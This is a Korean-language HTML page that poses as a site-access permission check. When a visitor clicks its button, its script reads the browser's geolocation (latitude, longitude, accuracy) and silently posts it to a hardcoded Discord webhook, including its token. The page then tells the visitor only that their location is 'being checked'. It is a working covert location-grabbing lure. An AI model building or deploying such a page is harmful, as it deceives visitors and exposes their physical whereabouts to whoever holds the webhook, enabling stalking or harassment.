<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <title>사이트 들어가기 전에 권한 확인</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
      margin: 2rem;
      background: #0f0f13;
      color: #eaeaea;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
    }
    p {
      margin: 0.5rem 0 1.2rem;
      color: #c9c9c9;
    }
    button {
      padding: 0.7rem 1.1rem;
      border: none;
      border-radius: 6px;
      background: #5865f2;
      color: #fff;
      font-size: 1rem;
      cursor: pointer;
    }
    button:hover {
      background: #4752c4;
    }
    #status {
      margin-top: 1.2rem;
      padding: 0.6rem 0.8rem;
      border-radius: 6px;
      background: #1a1a22;
      color: #d4d4d4;
      font-size: 0.95rem;
      white-space: pre-line;
    }
    .warning {
      margin-top: 2rem;
      padding: 0.7rem 0.9rem;
      border-left: 4px solid #f23f43;
      background: #1a1a22;
      color: #e3a1a2;
      font-size: 0.9rem;
    }
  </style>
</head>
<body>
  <h1>권한 허용하기</h1>
  <p>
    아래 버튼을 누르면 브라우저에서 위치 권한을 요청합니다.<br />
    권한을 허용하면 이 사이트를 이용 할 수 있습니다.
  </p>

  <button id="sendLocation">권한 확인</button>
  <div id="status"></div>

  <div class="warning">
    .<br />
    .
  </div>

  <script>
    // ===== 여기에 Discord 웹훅 URL 넣기 =====
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ";
    // =======================================

    const statusEl = document.getElementById("status");
    const btn = document.getElementById("sendLocation");

    btn.addEventListener("click", () => {
      if (!navigator.geolocation) {
        statusEl.textContent = "이 브라우저는 위치 API 를 지원하지 않습니다.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;
          const accuracy = position.coords.accuracy;

          const message =
            `위치 정보:
` +
            `위도: ${lat}
` +
            `경도: ${lng}
` +
            `정확도: ±${Math.round(accuracy)}m`;

          fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: message })
          })
          .then((res) => {
            if (res.ok) {
              statusEl.textContent = "위치 정보를 확인중입니다.";
            } else {
              statusEl.textContent = "전송 실패: " + res.status + " " + res.statusText;
            }
          })
          .catch((err) => {
            statusEl.textContent = "전송 중 오류 발생: " + err.message;
          });
        },
        (error) => {
          switch (error.code) {
            case error.PERMISSION_DENIED:
              statusEl.textContent = "위치 권한이 거부되었습니다.";
              break;
            case error.POSITION_UNAVAILABLE:
              statusEl.textContent = "위치 정보를 사용할 수 없습니다.";
              break;
            case error.TIMEOUT:
              statusEl.textContent = "위치 정보 요청 시간이 초과되었습니다.";
              break;
            default:
              statusEl.textContent = "알 수 없는 오류가 발생했습니다.";
          }
        }
      );
    });
  </script>
</body>
</html>
